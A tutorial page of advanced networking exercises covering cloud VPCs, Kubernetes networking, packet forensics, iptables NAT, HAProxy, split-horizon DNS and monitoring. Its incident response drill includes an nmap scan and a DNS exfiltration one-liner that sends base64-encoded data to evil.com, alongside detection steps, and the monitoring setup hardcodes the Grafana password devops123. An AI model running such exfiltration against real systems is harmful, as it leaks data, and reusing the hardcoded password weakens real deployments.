[🏠 Home](../../README.md) · [Tasks](../README.md) · [Networking Tasks](.)

# 🌐 Networking Tasks — Level 3 (🔴 Hard)

> **Objective:** Advanced networking — cloud VPC design, Kubernetes networking, complex troubleshooting, security hardening, and production architecture.  
> **Prerequisites:** Completed Levels 1 and 2, Docker & kubectl installed  
> **Time Estimate:** 8–10 hours total

---

## Table of Contents

1. [Cloud VPC Design & Implementation](#1-cloud-vpc-design--implementation)
2. [Kubernetes Networking — Services, DNS & Ingress](#2-kubernetes-networking--services-dns--ingress)
3. [Complex tcpdump Forensics & Troubleshooting](#3-complex-tcpdump-forensics--troubleshooting)
4. [Multi-Tier Network Architecture with iptables NAT](#4-multi-tier-network-architecture-with-iptables-nat)
5. [HAProxy Advanced Load Balancing](#5-haproxy-advanced-load-balancing)
6. [Network Security Incident Response Drill](#6-network-security-incident-response-drill)
7. [Kubernetes CNI & Network Policies](#7-kubernetes-cni--network-policies)
8. [DNS Infrastructure — Split-Horizon & Failover](#8-dns-infrastructure--split-horizon--failover)
9. [Production Network Monitoring Stack](#9-production-network-monitoring-stack)
10. [Full Production Architecture Design Challenge](#10-full-production-architecture-design-challenge)

---

## 1. Cloud VPC Design & Implementation

### Objective
Design and implement a multi-tier VPC architecture with public/private subnets, NAT, and security groups.

### Architecture
```
  ┌──────────────────── VPC: 10.0.0.0/16 ─────────────────────────┐
  │                                                                 │
  │  ┌── Public Subnet: 10.0.1.0/24 ──┐  ┌── Public: 10.0.2.0/24─┐│
  │  │  ALB / Bastion Host             │  │  ALB (AZ-b)           ││
  │  │  NAT Gateway                    │  │                        ││
  │  └────────────────────────────────┘  └────────────────────────┘│
  │  ┌── Private Subnet: 10.0.3.0/24 ─┐  ┌── Private: 10.0.4.0/24┐│
  │  │  App Servers (AZ-a)             │  │  App Servers (AZ-b)   ││
  │  └────────────────────────────────┘  └────────────────────────┘│
  │  ┌── Data Subnet: 10.0.5.0/24 ────┐  ┌── Data: 10.0.6.0/24 ──┐│
  │  │  RDS / ElastiCache (AZ-a)       │  │  RDS Standby (AZ-b)  ││
  │  └────────────────────────────────┘  └────────────────────────┘│
  │                                                                 │
  │  Internet Gateway         NAT Gateway           Route Tables    │
  └─────────────────────────────────────────────────────────────────┘
```

### Tasks

**1.1** Using AWS CLI (or LocalStack for local testing), create the VPC:
```bash
# Create VPC
aws ec2 create-vpc --cidr-block 10.0.0.0/16 --tag-specifications \
  'ResourceType=vpc,Tags=[{Key=Name,Value=devops-prod-vpc}]'

# Enable DNS hostnames
VPC_ID=<vpc-id-from-above>
aws ec2 modify-vpc-attribute --vpc-id $VPC_ID --enable-dns-hostnames
```

**1.2** Create the 6 subnets across 2 AZs:
```bash
# Public Subnet AZ-a
aws ec2 create-subnet --vpc-id $VPC_ID --cidr-block 10.0.1.0/24 \
  --availability-zone us-east-1a --tag-specifications \
  'ResourceType=subnet,Tags=[{Key=Name,Value=public-az-a}]'

# Public Subnet AZ-b
aws ec2 create-subnet --vpc-id $VPC_ID --cidr-block 10.0.2.0/24 \
  --availability-zone us-east-1b --tag-specifications \
  'ResourceType=subnet,Tags=[{Key=Name,Value=public-az-b}]'

# Repeat for private (10.0.3.0/24, 10.0.4.0/24) and data (10.0.5.0/24, 10.0.6.0/24)
```

**1.3** Create Internet Gateway and NAT Gateway:
```bash
# Internet Gateway
IGW_ID=$(aws ec2 create-internet-gateway --query 'InternetGateway.InternetGatewayId' --output text)
aws ec2 attach-internet-gateway --internet-gateway-id $IGW_ID --vpc-id $VPC_ID

# Elastic IP for NAT
EIP_ALLOC=$(aws ec2 allocate-address --domain vpc --query 'AllocationId' --output text)

# NAT Gateway in public subnet
aws ec2 create-nat-gateway --subnet-id <public-subnet-id> --allocation-id $EIP_ALLOC
```

**1.4** Create route tables:
```bash
# Public route table — routes to IGW
PUBLIC_RT=$(aws ec2 create-route-table --vpc-id $VPC_ID --query 'RouteTable.RouteTableId' --output text)
aws ec2 create-route --route-table-id $PUBLIC_RT --destination-cidr-block 0.0.0.0/0 --gateway-id $IGW_ID

# Private route table — routes to NAT
PRIVATE_RT=$(aws ec2 create-route-table --vpc-id $VPC_ID --query 'RouteTable.RouteTableId' --output text)
aws ec2 create-route --route-table-id $PRIVATE_RT --destination-cidr-block 0.0.0.0/0 --nat-gateway-id <nat-gw-id>
```

**1.5** Create security groups:
```bash
# ALB Security Group — allow 80 and 443 from internet
ALB_SG=$(aws ec2 create-security-group --group-name alb-sg --description "ALB SG" --vpc-id $VPC_ID --query 'GroupId' --output text)
aws ec2 authorize-security-group-ingress --group-id $ALB_SG --protocol tcp --port 80 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-ingress --group-id $ALB_SG --protocol tcp --port 443 --cidr 0.0.0.0/0

# App SG — only from ALB
APP_SG=$(aws ec2 create-security-group --group-name app-sg --description "App SG" --vpc-id $VPC_ID --query 'GroupId' --output text)
aws ec2 authorize-security-group-ingress --group-id $APP_SG --protocol tcp --port 8080 --source-group $ALB_SG

# DB SG — only from App
DB_SG=$(aws ec2 create-security-group --group-name db-sg --description "DB SG" --vpc-id $VPC_ID --query 'GroupId' --output text)
aws ec2 authorize-security-group-ingress --group-id $DB_SG --protocol tcp --port 5432 --source-group $APP_SG
```

**1.6** Validate the design:
- Public subnets can reach the internet via IGW
- Private subnets can reach the internet (outbound only) via NAT
- Database subnets have no internet access at all
- Security groups enforce: Internet → ALB → App → DB (no skipping tiers)

### Verification
- All 6 subnets exist in correct AZs
- Route tables are correct (public→IGW, private→NAT, data→local only)
- Security groups enforce tier-to-tier access patterns

---

## 2. Kubernetes Networking — Services, DNS & Ingress

### Objective
Explore Kubernetes networking: Pod IPs, Services, DNS, and Ingress controllers.

### Architecture
```
  ┌───────────────────── K8s Cluster ─────────────────────┐
  │                                                        │
  │   Ingress (nginx-ingress-controller)                   │
  │     │                                                  │
  │     ├── /api  ──► Service: api-svc ──► Pod: api-1     │
  │     │                               ──► Pod: api-2     │
  │     │                                                  │
  │     └── /web  ──► Service: web-svc ──► Pod: web-1     │
  │                                     ──► Pod: web-2     │
  │                                                        │
  │   CoreDNS: api-svc.default.svc.cluster.local           │
  └────────────────────────────────────────────────────────┘
```

### Tasks

**2.1** Create a deployment and service:
```yaml
# api-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  replicas: 2
  selector:
    matchLabels:
      app: api
  template:
    metadata:
      labels:
        app: api
    spec:
      containers:
      - name: api
        image: hashicorp/http-echo
        args: ["-text=Hello from API"]
        ports:
        - containerPort: 5678
---
apiVersion: v1
kind: Service
metadata:
  name: api-svc
spec:
  selector:
    app: api
  ports:
  - port: 80
    targetPort: 5678
  type: ClusterIP
```

```bash
kubectl apply -f api-deployment.yaml
```

**2.2** Verify Pod networking:
```bash
# Each pod gets a unique IP
kubectl get pods -o wide

# Exec into a pod and verify its network
kubectl exec -it <pod-name> -- sh
  ip addr show
  cat /etc/resolv.conf
```

**2.3** Test Service DNS resolution:
```bash
# From inside a pod
kubectl exec -it <pod-name> -- nslookup api-svc
kubectl exec -it <pod-name> -- nslookup api-svc.default.svc.cluster.local
```

**2.4** Install Nginx Ingress Controller:
```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.9.4/deploy/static/provider/cloud/deploy.yaml
```

**2.5** Create an Ingress resource:
```yaml
# ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: app-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
spec:
  ingressClassName: nginx
  rules:
  - host: myapp.local
    http:
      paths:
      - path: /api
        pathType: Prefix
        backend:
          service:
            name: api-svc
            port:
              number: 80
```

```bash
kubectl apply -f ingress.yaml
kubectl get ingress
```

**2.6** Test the Ingress:
```bash
curl -H "Host: myapp.local" http://<ingress-ip>/api
```

### Verification
- Pods have unique IPs and can communicate directly
- Service DNS resolves to the ClusterIP
- Ingress routes traffic based on path

---

## 3. Complex tcpdump Forensics & Troubleshooting

### Objective
Use advanced tcpdump and tshark techniques to diagnose complex network issues.

### Scenario
A production application reports intermittent connection timeouts. You need to capture and analyze traffic to identify the root cause.

### Tasks

**3.1** Capture traffic with detailed timestamps for latency analysis:
```bash
sudo tcpdump -i eth0 'tcp port 80' -nn -tt -c 200 -w /tmp/forensic.pcap
```

**3.2** Analyze TCP retransmissions (sign of packet loss):
```bash
tcpdump -r /tmp/forensic.pcap 'tcp[tcpflags] & (tcp-syn) != 0' -nn | wc -l
# Compare SYN count vs SYN-ACK count
tcpdump -r /tmp/forensic.pcap 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' -nn | wc -l
```

**3.3** Identify TCP RST (reset) packets:
```bash
tcpdump -r /tmp/forensic.pcap 'tcp[tcpflags] & (tcp-rst) != 0' -nn
```
- High RST count may indicate firewall resets or application crashes

**3.4** Analyze connection durations using tshark:
```bash
sudo apt install tshark -y

# Show TCP stream statistics
tshark -r /tmp/forensic.pcap -z conv,tcp
```

**3.5** Extract HTTP request/response pairs:
```bash
tshark -r /tmp/forensic.pcap -Y http.request -T fields \
  -e frame.time -e ip.src -e http.request.method -e http.request.uri
```

**3.6** Detect TCP window size issues (zero window = receiver buffer full):
```bash
tshark -r /tmp/forensic.pcap -Y 'tcp.window_size == 0'
```

**3.7** Check for duplicate ACKs (fast retransmission trigger):
```bash
tshark -r /tmp/forensic.pcap -Y 'tcp.analysis.duplicate_ack'
```

### Verification
- You can identify retransmissions, RSTs, and zero-window conditions
- You understand how to correlate packet captures with application issues

---

## 4. Multi-Tier Network Architecture with iptables NAT

### Objective
Build a router/gateway using iptables with NAT, port forwarding, and traffic shaping.

### Architecture
```
  Internet ──► [Gateway: 192.168.1.100] ──► [Internal: 10.0.0.0/24]
                     │
                     ├── SNAT (Masquerade) for outbound
                     ├── DNAT port 80 → 10.0.0.10:80 (web)
                     ├── DNAT port 22 → 10.0.0.20:22 (admin)
                     └── Rate limiting on SSH
```

### Tasks

**4.1** Enable IP forwarding:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

**4.2** Set up SNAT (Masquerade) for internal network:
```bash
# All internal traffic appears as the gateway's IP
sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE
```

**4.3** Set up DNAT (port forwarding):
```bash
# Forward port 80 to internal web server
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.10:80

# Forward port 2222 to internal admin server's SSH
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 2222 -j DNAT --to-destination 10.0.0.20:22

# Allow forwarded traffic
sudo iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 80 -d 10.0.0.10 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 22 -d 10.0.0.20 -j ACCEPT
```

**4.4** Add rate limiting for SSH to prevent brute force:
```bash
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

**4.5** Log dropped packets:
```bash
sudo iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROP: " --log-level 4
sudo iptables -A INPUT -j DROP
```

**4.6** Save and persist rules:
```bash
sudo apt install iptables-persistent -y
sudo netfilter-persistent save
```

**4.7** Verify NAT translations:
```bash
sudo conntrack -L
sudo iptables -t nat -L -n -v
```

### Verification
- Internal hosts can access the internet through the gateway (SNAT)
- External clients can reach the web server through the gateway's port 80 (DNAT)
- SSH rate limiting blocks after 4 attempts per minute

---

## 5. HAProxy Advanced Load Balancing

### Objective
Set up HAProxy with advanced features: ACLs, health checks, sticky sessions, and rate limiting.

### Tasks

**5.1** Install HAProxy:
```bash
sudo apt install haproxy -y
```

**5.2** Configure HAProxy with full production features:
```bash
sudo tee /etc/haproxy/haproxy.cfg << 'EOF'
global
    log /dev/log local0
    maxconn 4096
    user haproxy
    group haproxy

defaults
    log     global
    mode    http
    option  httplog
    option  dontlognull
    timeout connect 5s
    timeout client  30s
    timeout server  30s
    retries 3

frontend http_front
    bind *:80
    
    # ACL-based routing
    acl is_api path_beg /api
    acl is_static path_end .css .js .png .jpg
    acl is_health path /health
    
    # Rate limiting (10 req/sec per IP)
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 100 }
    
    # Health check endpoint
    http-request return status 200 content-type text/plain string "OK" if is_health
    
    # Route based on ACL
    use_backend api_servers if is_api
    use_backend static_servers if is_static
    default_backend app_servers

backend app_servers
    balance roundrobin
    option httpchk GET /health
    cookie SERVERID insert indirect nocache
    server app1 127.0.0.1:8081 check cookie app1
    server app2 127.0.0.1:8082 check cookie app2

backend api_servers
    balance leastconn
    option httpchk GET /health
    server api1 127.0.0.1:9001 check
    server api2 127.0.0.1:9002 check

backend static_servers
    balance roundrobin
    server static1 127.0.0.1:8090 check
EOF
```

**5.3** Enable the HAProxy stats page:
```bash
# Add to haproxy.cfg inside frontend or a new listen block:
cat << 'EOF' | sudo tee -a /etc/haproxy/haproxy.cfg

listen stats
    bind *:8404
    stats enable
    stats uri /stats
    stats refresh 10s
    stats admin if LOCALHOST
EOF
```

**5.4** Validate and reload:
```bash
haproxy -c -f /etc/haproxy/haproxy.cfg
sudo systemctl reload haproxy
```

**5.5** Access the stats dashboard:
```bash
curl http://localhost:8404/stats
# Or open in browser: http://<server-ip>:8404/stats
```

### Verification
- API traffic routes to `api_servers`, static files to `static_servers`
- Rate limiting returns HTTP 429 when exceeded
- Stats page shows backend health and traffic distribution

---

## 6. Network Security Incident Response Drill

### Objective
Simulate and respond to common network security incidents.

### Scenario 1 — Port Scan Detection

**6.1** Simulate a port scan (attacker):
```bash
nmap -sS -p 1-1000 <target-ip>
```

**6.2** Detect the port scan (defender):
```bash
# Monitor SYN packets to multiple ports
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0' -nn | head -50
```
- Many SYN packets from one IP to sequential ports = port scan

**6.3** Block the scanner:
```bash
sudo iptables -I INPUT -s <scanner-ip> -j DROP
```

### Scenario 2 — DNS Exfiltration Detection

**6.4** Simulate DNS exfiltration:
```bash
# Attacker encodes data in DNS queries
dig $(echo "secret data" | base64).evil.com
```

**6.5** Detect unusual DNS patterns:
```bash
# Look for unusually long DNS queries
sudo tcpdump -i eth0 'udp port 53' -nn -l | awk '{if(length($0) > 200) print}'
```

### Scenario 3 — SYN Flood Mitigation

**6.6** Enable SYN cookies:
```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048
```

**6.7** Rate limit SYN packets with iptables:
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

### Verification
- You can detect port scans, DNS exfiltration, and SYN floods
- You know the immediate response actions for each scenario

---

## 7. Kubernetes CNI & Network Policies

### Objective
Implement Kubernetes Network Policies for microsegmentation.

### Tasks

**7.1** Deploy test workloads:
```bash
kubectl create namespace production
kubectl create namespace staging

# Deploy in production
kubectl run web --image=nginx --port=80 -n production --labels="app=web,tier=frontend"
kubectl expose pod web --port=80 -n production

kubectl run api --image=nginx --port=80 -n production --labels="app=api,tier=backend"
kubectl expose pod api --port=80 -n production

kubectl run db --image=nginx --port=80 -n production --labels="app=db,tier=data"
kubectl expose pod db --port=80 -n production
```

**7.2** Default deny all ingress in production:
```yaml
# deny-all.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-ingress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
```

```bash
kubectl apply -f deny-all.yaml
```

**7.3** Allow only web to talk to api:
```yaml
# allow-web-to-api.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: web
    ports:
    - port: 80
```

**7.4** Allow only api to talk to db:
```yaml
# allow-api-to-db.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: db
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api
    ports:
    - port: 80
```

**7.5** Deny cross-namespace traffic (staging cannot reach production):
```yaml
# deny-cross-namespace.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-from-staging
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: production
```

**7.6** Verify policies:
```bash
# This should succeed (web → api)
kubectl exec -n production web -- curl -s --max-time 3 api

# This should FAIL (web → db, blocked)
kubectl exec -n production web -- curl -s --max-time 3 db

# This should FAIL (staging → production, blocked)
kubectl run test --image=busybox -n staging --rm -it -- wget -qO- --timeout=3 web.production.svc.cluster.local
```

### Verification
- Default deny blocks all traffic
- Only allowed paths (web→api→db) work
- Cross-namespace traffic is blocked

---

## 8. DNS Infrastructure — Split-Horizon & Failover

### Objective
Configure split-horizon DNS (different responses for internal vs external) and DNS failover.

### Architecture
```
  ┌─────────────────────────────────────────────┐
  │             BIND9 DNS Server                 │
  │                                              │
  │  View: internal (10.0.0.0/8)                │
  │    app.company.com → 10.0.1.50 (private IP) │
  │                                              │
  │  View: external (any)                        │
  │    app.company.com → 203.0.113.50 (public)  │
  └─────────────────────────────────────────────┘
```

### Tasks

**8.1** Configure BIND9 split-horizon:
```bash
sudo tee /etc/bind/named.conf.local << 'EOF'
acl internal-nets {
    10.0.0.0/8;
    172.16.0.0/12;
    192.168.0.0/16;
    localhost;
};

view "internal" {
    match-clients { internal-nets; };
    
    zone "company.com" {
        type master;
        file "/etc/bind/db.company.com.internal";
    };
};

view "external" {
    match-clients { any; };
    
    zone "company.com" {
        type master;
        file "/etc/bind/db.company.com.external";
    };
};
EOF
```

**8.2** Create internal zone:
```bash
sudo tee /etc/bind/db.company.com.internal << 'EOF'
$TTL    300
@       IN      SOA     ns1.company.com. admin.company.com. (
                          2024010101 604800 86400 2419200 300 )
@       IN      NS      ns1.company.com.
ns1     IN      A       10.0.1.5
app     IN      A       10.0.1.50
db      IN      A       10.0.1.60
cache   IN      A       10.0.1.70
EOF
```

**8.3** Create external zone:
```bash
sudo tee /etc/bind/db.company.com.external << 'EOF'
$TTL    300
@       IN      SOA     ns1.company.com. admin.company.com. (
                          2024010101 604800 86400 2419200 300 )
@       IN      NS      ns1.company.com.
ns1     IN      A       203.0.113.5
app     IN      A       203.0.113.50
EOF
```

**8.4** Test from different source networks:
```bash
# From internal network
dig @localhost app.company.com +short    # Should return 10.0.1.50

# From external (or simulate with tsig)
dig @<server-ip> app.company.com +short  # Should return 203.0.113.50
```

### Verification
- Internal clients resolve `app.company.com` to private IPs
- External clients resolve to public IPs
- Internal zone includes `db` and `cache` records not visible externally

---

## 9. Production Network Monitoring Stack

### Objective
Deploy a network monitoring stack using Prometheus + Grafana + SNMP/Blackbox Exporter.

### Tasks

**9.1** Create a docker-compose monitoring stack:
```yaml
# docker-compose-monitoring.yml
version: '3.8'
services:
  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    networks:
      - monitoring

  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=devops123
    networks:
      - monitoring

  blackbox-exporter:
    image: prom/blackbox-exporter:latest
    ports:
      - "9115:9115"
    volumes:
      - ./blackbox.yml:/etc/blackbox_exporter/config.yml
    networks:
      - monitoring

  node-exporter:
    image: prom/node-exporter:latest
    ports:
      - "9100:9100"
    networks:
      - monitoring

networks:
  monitoring:
    driver: bridge
```

**9.2** Create Prometheus config with blackbox probes:
```yaml
# prometheus.yml
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  - job_name: 'blackbox-http'
    metrics_path: /probe
    params:
      module: [http_2xx]
    static_configs:
      - targets:
        - https://google.com
        - https://github.com
        - http://localhost:80
    relabel_configs:
      - source_labels: [__address__]
        target_label: __param_target
      - source_labels: [__param_target]
        target_label: instance
      - target_label: __address__
        replacement: blackbox-exporter:9115

  - job_name: 'blackbox-icmp'
    metrics_path: /probe
    params:
      module: [icmp]
    static_configs:
      - targets:
        - 8.8.8.8
        - 1.1.1.1
    relabel_configs:
      - source_labels: [__address__]
        target_label: __param_target
      - source_labels: [__param_target]
        target_label: instance
      - target_label: __address__
        replacement: blackbox-exporter:9115
```

**9.3** Create Blackbox Exporter config:
```yaml
# blackbox.yml
modules:
  http_2xx:
    prober: http
    timeout: 5s
    http:
      valid_http_versions: ["HTTP/1.1", "HTTP/2.0"]
      valid_status_codes: [200, 301, 302]
      method: GET
      follow_redirects: true
  icmp:
    prober: icmp
    timeout: 5s
  dns_resolve:
    prober: dns
    timeout: 5s
    dns:
      query_name: google.com
      query_type: A
```

**9.4** Deploy the stack:
```bash
docker compose -f docker-compose-monitoring.yml up -d
```

**9.5** Access dashboards:
- Prometheus: `http://localhost:9090`
- Grafana: `http://localhost:3000` (admin/devops123)

**9.6** Create alerting rules:
```yaml
# Alert if any HTTP probe fails for > 2 minutes
groups:
- name: network-alerts
  rules:
  - alert: EndpointDown
    expr: probe_success == 0
    for: 2m
    labels:
      severity: critical
    annotations:
      summary: "Endpoint {{ $labels.instance }} is down"
```

### Verification
- Prometheus scrapes metrics from all exporters
- Blackbox exporter probes external endpoints
- You can create alerting rules for endpoint failures

---

## 10. Full Production Architecture Design Challenge

### Objective
Design a complete network architecture for a production web application. This is a design + documentation exercise.

### Requirements
Your application needs to serve:
- 10,000 concurrent users globally
- 99.99% uptime SLA
- PCI-DSS compliance (credit card processing)
- Data residency in US and EU

### Tasks

**10.1** Draw the full architecture (use ASCII or a diagramming tool):
```
Design should include:
  ┌─────────────────────────────────────────────────┐
  │  CDN (CloudFront / Cloudflare)                  │
  │  ↓                                               │
  │  WAF (Web Application Firewall)                  │
  │  ↓                                               │
  │  Global Load Balancer (Route 53 / Traffic Mgr)   │
  │  ↓                          ↓                    │
  │  US Region                 EU Region             │
  │  ┌─── VPC ──────────┐    ┌─── VPC ──────────┐   │
  │  │ ALB → App → DB   │    │ ALB → App → DB   │   │
  │  │ + Redis Cache     │    │ + Redis Cache     │   │
  │  │ + Monitoring      │    │ + Monitoring      │   │
  │  └──────────────────┘    └──────────────────┘   │
  │                                                   │
  │  VPC Peering / Transit Gateway between regions    │
  │  VPN to Corporate HQ for admin access             │
  └───────────────────────────────────────────────────┘
```

**10.2** Document the following components:

| Component | Choice | Justification |
|-----------|--------|---------------|
| DNS | ? | How will you route users to nearest region? |
| CDN | ? | What content will be cached? Cache invalidation strategy? |
| WAF | ? | What rules will you implement? |
| Load Balancer | ? | L4 or L7? SSL termination point? |
| App Networking | ? | Container networking? Service mesh? |
| DB Networking | ? | Cross-region replication? Failover? |
| Monitoring | ? | What metrics? What alerts? |
| Security | ? | Encryption in transit/at rest? Key management? |

**10.3** Create a network security matrix:

| Source → Destination | Protocol | Port | Allowed? | Justification |
|---------------------|----------|------|----------|---------------|
| Internet → CDN | HTTPS | 443 | ✅ | Public access |
| CDN → ALB | HTTPS | 443 | ✅ | Origin fetch |
| ALB → App | HTTP | 8080 | ✅ | Internal only |
| App → DB | TCP | 5432 | ✅ | App queries |
| Internet → DB | ANY | ANY | ❌ | No direct access |
| App → Internet | HTTPS | 443 | ✅ | External APIs |
| ... fill in the rest | | | | |

**10.4** Write a DR (Disaster Recovery) runbook for a network failure:
- Document: what if the primary region's VPC goes down?
- Document: DNS failover procedure
- Document: database failover and data consistency

**10.5** Review checklist:
- [ ] All traffic encrypted in transit (TLS 1.2+)
- [ ] No public IPs on app or DB servers
- [ ] DDoS protection at edge
- [ ] Network segmentation between tiers
- [ ] VPC flow logs enabled
- [ ] DNS failover with health checks
- [ ] Cross-region data replication
- [ ] Network monitoring and alerting
- [ ] Firewall rules documented and reviewed
- [ ] PCI-DSS network requirements met (segmented CDE)

### Verification
- Complete architecture diagram with all network components
- Security matrix covers all traffic flows
- DR runbook is actionable and tested

---

> **Level 3 Complete!** You now have advanced networking skills ready for production environments.  
> **Review:** [Level 1](level_1.md) · [Level 2](level_2.md) · [Networking Handbook](../../networking/networking_handbook.md)

[🏠 Home](../../README.md) · [Tasks](../README.md)
